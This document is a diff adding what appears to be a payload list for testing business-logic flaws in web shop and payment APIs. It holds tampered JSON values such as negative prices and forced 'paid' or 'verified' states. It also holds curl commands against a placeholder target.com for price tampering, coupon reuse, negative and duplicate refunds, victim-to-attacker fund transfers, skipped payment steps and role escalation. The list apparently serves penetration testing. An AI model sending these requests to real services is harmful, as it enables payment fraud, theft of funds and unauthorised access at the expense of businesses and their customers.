@@ -1,0 +1,37 @@
+{"price": -1}
+{"amount": -100}
+{"quantity": -1}
+{"price": 0}
+{"amount": 0}
+{"price": 0.001}
+{"quantity": 0}
+{"discount": 100}
+{"discount": 101}
+{"discount": -1}
+{"coupon_code": "AAAA", "apply_count": 999}
+{"price": "0"}
+{"price": ""}
+{"price": null}
+{"price": 9999999999}
+{"quantity": 9999999999}
+{"total": 0, "items": [{"id": 1, "price": 100, "quantity": 1}]}
+curl -s -X POST https://target.com/api/checkout -d '{"cart_id":"{id}","total":0.01}' -H "Content-Type: application/json" -b "session={session}"
+curl -s -X POST https://target.com/api/apply-coupon -d '{"code":"SAVE50"}' multiple times with same session
+curl -s -X POST https://target.com/api/refund -d '{"order_id":"{id}","amount":999}' -H "Content-Type: application/json"
+curl -s -X POST https://target.com/api/refund -d '{"order_id":"{id}","amount":-100}' (negative refund = charge)
+curl -s -X POST https://target.com/api/transfer -d '{"to":"{attacker_id}","from":"{victim_id}","amount":1000}'
+curl -s -X POST https://target.com/api/order -d '{"items":[{"id":1,"quantity":1}],"payment_method":"wallet"}' (pay with 0-balance wallet)
+curl -s -X POST https://target.com/api/upgrade -d '{"plan":"free"}' (downgrade to free while keeping premium features)
+curl -s -X POST https://target.com/api/invite -d '{"email":"x@x.com","role":"owner"}' (invite with elevated role)
+curl -s -X POST https://target.com/api/withdraw -d '{"amount":100}' then immediately GET /api/balance (TOCTOU)
+curl -s -X PUT https://target.com/api/order/{id}/status -d '{"status":"delivered"}' -H "Authorization: Bearer {user_token}"
+curl -s -X POST https://target.com/api/order -d '{"product_id":"{premium_id}","price":0.01}' (price tampering)
+curl -s -X POST https://target.com/api/signup -d '{"plan":"enterprise","payment":"skip"}' (skip payment step)
+curl -s -X GET https://target.com/api/feature/premium -b "session={free_user_session}" (access paid features)
+{"step": 3} (skip workflow steps: go from step 1 to step 3 directly)
+{"state": "completed"} (force state machine to terminal state)
+{"verified": true} (mark unverified account as verified)
+{"payment_status": "paid"} (mark order as paid without payment)
+curl -s -X DELETE https://target.com/api/order/{id} after initiating a refund (delete to get both)
+curl -s -X POST https://target.com/api/flight -d '{"seats":1,"price":0}' (zero-cost booking)
+curl -s -X POST https://target.com/api/reward -d '{"action":"signup","user_id":"{id}"}' (replay reward actions)
